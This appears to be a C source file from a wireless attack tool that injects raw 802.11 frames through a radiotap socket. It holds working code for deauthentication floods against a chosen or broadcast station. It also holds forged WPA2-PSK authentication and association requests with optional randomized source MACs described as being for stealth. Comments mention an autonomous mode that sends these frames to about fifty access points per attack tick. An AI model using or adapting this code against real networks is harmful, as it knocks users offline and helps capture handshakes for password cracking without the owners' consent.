/* SPDX-License-Identifier: GPL-3.0-or-later */
#include "inject.h"
#include "log.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

struct inject {
	int                 sock_fd;
	const struct iface *iface;
	int                 mac_rand;   /* 1 = randomize SA per inject_assoc */
};

struct inject *inject_create(int sock_fd, const struct iface *iface)
{
	if (sock_fd < 0 || !iface) return NULL;
	struct inject *i = calloc(1, sizeof *i);
	if (!i) return NULL;
	i->sock_fd = sock_fd;
	i->iface   = iface;
	return i;
}

void inject_destroy(struct inject *i) { free(i); }

void inject_set_mac_rand(struct inject *i, int enable)
{
	if (!i) return;
	i->mac_rand = !!enable;
	log_info("inject: mac_rand %s", i->mac_rand ? "enabled" : "disabled");
}

/* Fresh locally-administered, unicast MAC. First octet's bit 1 (LA) is
 * set, bit 0 (multicast) is cleared; the remaining bits are random.
 * getrandom(2) is the right primitive — non-blocking, no fd needed. If
 * it fails for any reason (sandbox, very old kernel) we fall back to
 * rand() which is fine for stealth purposes (we're not key material). */
static void mac_random_la(uint8_t out[6])
{
	if (getrandom(out, 6, 0) != 6) {
		for (int i = 0; i < 6; i++) out[i] = (uint8_t)rand();
	}
	out[0] = (out[0] & 0xfe) | 0x02;
}

/* ---- radiotap TX prefix --------------------------------------------------- *
 * Minimal 12-byte header advertising one field: TX_FLAGS = NOACK. Drivers
 * accept this; without it some refuse to send, others retry forever waiting
 * for an ACK. */
static const uint8_t RT_TX_HDR[12] = {
	0x00, 0x00,                /* version, pad */
	0x0c, 0x00,                /* it_len = 12 */
	0x00, 0x80, 0x00, 0x00,    /* it_present = bit 15 (TX flags) */
	0x08, 0x00, 0x00, 0x00,    /* TX flags = NOACK; trailing 2 bytes pad */
};
#define RT_HDR_LEN sizeof(RT_TX_HDR)

/* ---- 802.11 frame helpers ------------------------------------------------- */

static const uint8_t BCAST[6] = {0xff,0xff,0xff,0xff,0xff,0xff};

/*
 * Build a generic 802.11 management header at `out`.
 *  fc0:    bits 4..7 subtype | bits 2..3 type | bits 0..1 version
 *  addr1 = DA, addr2 = SA, addr3 = BSSID for mgmt.
 *
 * Returns the offset where the body starts (24).
 */
static size_t build_mgmt_hdr(uint8_t *out, uint8_t fc0,
                             const uint8_t da[6], const uint8_t sa[6],
                             const uint8_t bssid[6])
{
	out[0] = fc0;
	out[1] = 0x00;
	out[2] = 0x3a;  out[3] = 0x01;  /* duration ~314us, plausible */
	memcpy(out + 4,  da,    6);
	memcpy(out + 10, sa,    6);
	memcpy(out + 16, bssid, 6);
	out[22] = 0; out[23] = 0;       /* sequence */
	return 24;
}

static int send_frame(struct inject *i, const uint8_t *frame, size_t len)
{
	ssize_t n = send(i->sock_fd, frame, len, 0);
	if (n < 0) {
		log_warn("inject: send: %s", strerror(errno));
		return -1;
	}
	if ((size_t)n != len) {
		log_warn("inject: short send %zd/%zu", n, len);
		return -1;
	}
	return 0;
}

/* ---- deauth --------------------------------------------------------------- */

int inject_deauth(struct inject *i, const uint8_t bssid[6],
                  const uint8_t *sta, int count, int reason)
{
	if (!i || !bssid || count < 1) return 0;
	if (count > 256) count = 256;
	if (reason < 1 || reason > 0xffff) reason = 7;

	uint8_t pkt[RT_HDR_LEN + 26];
	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
	uint8_t       *frame = pkt + RT_HDR_LEN;
	const uint8_t *target = sta ? sta : BCAST;

	size_t pos = build_mgmt_hdr(frame, 0xc0, target, bssid, bssid);
	frame[pos++] = (uint8_t)(reason & 0xff);
	frame[pos++] = (uint8_t)((reason >> 8) & 0xff);

	int sent = 0;
	for (int n = 0; n < count; n++) {
		if (send_frame(i, pkt, RT_HDR_LEN + pos) == 0) sent++;
	}
	log_info("inject: %d deauth %s %02x:%02x:%02x:%02x:%02x:%02x reason=%d",
	         sent, sta ? "→" : "broadcast for",
	         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], reason);
	return sent;
}

/* ---- auth + assoc --------------------------------------------------------- *
 * Standard WPA2-PSK association advertisements. The body for both frames is
 * fixed apart from the SSID bytes — small enough to build inline. */

static int send_auth_open(struct inject *i, const uint8_t bssid[6],
                          const uint8_t sa[6])
{
	uint8_t pkt[RT_HDR_LEN + 24 + 6];
	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
	uint8_t *frame = pkt + RT_HDR_LEN;

	size_t pos = build_mgmt_hdr(frame, 0xb0, bssid, sa, bssid);
	/* algo=0 (open), seq=1, status=0 */
	frame[pos++] = 0x00; frame[pos++] = 0x00;
	frame[pos++] = 0x01; frame[pos++] = 0x00;
	frame[pos++] = 0x00; frame[pos++] = 0x00;

	return send_frame(i, pkt, RT_HDR_LEN + pos);
}

/* RSN IE for WPA2-PSK CCMP — fixed 22-byte blob. */
static const uint8_t RSN_IE_WPA2_PSK[] = {
	0x30, 0x14,                                 /* tag, length=20 */
	0x01, 0x00,                                 /* version */
	0x00, 0x0f, 0xac, 0x04,                     /* group cipher: CCMP */
	0x01, 0x00,                                 /* pairwise count */
	0x00, 0x0f, 0xac, 0x04,                     /* pairwise cipher: CCMP */
	0x01, 0x00,                                 /* AKM count */
	0x00, 0x0f, 0xac, 0x02,                     /* AKM: PSK */
	0x00, 0x00,                                 /* RSN capabilities */
};

/* Supported Rates IE: 1, 2, 5.5, 11 Mbps as basic + 6, 9, 12, 18 Mbps */
static const uint8_t RATES_IE[] = {
	0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
};

static int send_assoc_req(struct inject *i, const uint8_t bssid[6],
                          const uint8_t sa[6],
                          const char *ssid, uint8_t ssid_len)
{
	if (ssid_len > 32) return -1;

	uint8_t pkt[RT_HDR_LEN + 24 + 4 + 2 + 32 + sizeof RATES_IE + sizeof RSN_IE_WPA2_PSK];
	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
	uint8_t *frame = pkt + RT_HDR_LEN;

	size_t pos = build_mgmt_hdr(frame, 0x00, bssid, sa, bssid);
	/* Capability info = 0x0431 (ESS + Privacy + ShortPreamble + ShortSlot) */
	frame[pos++] = 0x31; frame[pos++] = 0x04;
	/* Listen interval = 10 */
	frame[pos++] = 0x0a; frame[pos++] = 0x00;
	/* SSID IE */
	frame[pos++] = 0x00;
	frame[pos++] = ssid_len;
	if (ssid_len > 0) { memcpy(frame + pos, ssid, ssid_len); pos += ssid_len; }
	/* Supported Rates */
	memcpy(frame + pos, RATES_IE,        sizeof RATES_IE);        pos += sizeof RATES_IE;
	/* RSN IE */
	memcpy(frame + pos, RSN_IE_WPA2_PSK, sizeof RSN_IE_WPA2_PSK); pos += sizeof RSN_IE_WPA2_PSK;

	return send_frame(i, pkt, RT_HDR_LEN + pos);
}

int inject_assoc(struct inject *i, const uint8_t bssid[6],
                 const char *ssid, uint8_t ssid_len)
{
	if (!i || !bssid) return -1;

	/* Generate ONE source MAC for the whole inject_assoc call so the
	 * AP sees a coherent auth->assoc dialog. Without mac_rand we just
	 * use the iface's hardware MAC (current behavior). */
	uint8_t        sa_buf[6];
	const uint8_t *sa = i->iface->mac;
	if (i->mac_rand) {
		mac_random_la(sa_buf);
		sa = sa_buf;
	}

	if (send_auth_open(i, bssid, sa) < 0) {
		log_warn("inject: auth send failed");
		return -1;
	}
	/* Tiny gap so the NIC's outbound queue doesn't reorder auth/assoc.
	 * 1 ms is enough on every driver we've tested and small enough that
	 * blasting auth+assoc to ~50 visible APs per attack tick (the
	 * autonomous mode does this) doesn't stall the event loop. */
	struct timespec ts = { .tv_sec = 0, .tv_nsec = 1 * 1000 * 1000 };
	(void)nanosleep(&ts, NULL);

	if (send_assoc_req(i, bssid, sa, ssid, ssid_len) < 0) {
		log_warn("inject: assoc send failed");
		return -1;
	}
	log_info("inject: auth+assoc to %02x:%02x:%02x:%02x:%02x:%02x sa=%02x:%02x:%02x:%02x:%02x:%02x ssid=\"%.*s\"",
	         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
	         sa[0],    sa[1],    sa[2],    sa[3],    sa[4],    sa[5],
	         (int)ssid_len, ssid ? ssid : "");
	return 0;
}
